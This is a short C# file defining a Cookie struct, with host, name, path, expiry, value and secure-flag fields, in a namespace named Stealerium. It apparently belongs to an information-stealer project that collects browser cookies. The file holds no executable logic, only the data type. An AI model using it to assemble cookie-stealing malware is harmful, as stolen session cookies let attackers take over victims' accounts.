namespace Stealerium.Helpers;

public struct Cookie
{
	public string HostKey { get; set; }

	public string Name { get; set; }

	public string Path { get; set; }

	public string ExpiresUtc { get; set; }

	public string Value { get; set; }

	public string IsSecure { get; set; }
}
